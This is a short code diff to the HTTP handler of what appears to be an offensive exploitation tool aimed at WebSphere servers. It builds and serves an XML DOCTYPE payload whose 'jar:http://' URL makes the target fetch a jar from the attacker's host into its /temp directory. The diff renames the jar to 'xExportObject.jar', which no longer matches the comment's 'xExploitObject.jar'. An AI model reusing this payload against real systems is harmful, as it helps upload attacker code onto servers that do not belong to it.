@@ -92,7 +92,7 @@ public class HttpServer implements HttpHandler {
 					//payload for artsploit.controllers.WebSphere1-2
 					//intended to upload xExploitObject.jar into the /temp directory on server
 					String uploadWsdl = "<!DOCTYPE a SYSTEM \"jar:http://" + Config.hostname + ":" + Config.httpPort +
-							"/xExploitObject.jar!/file.txt\"><a></a>";
+							"/xExportObject.jar!/file.txt\"><a></a>";
 					httpExchange.sendResponseHeaders(200, uploadWsdl.getBytes().length);
 					httpExchange.getResponseBody().write(uploadWsdl.getBytes());
 					break;
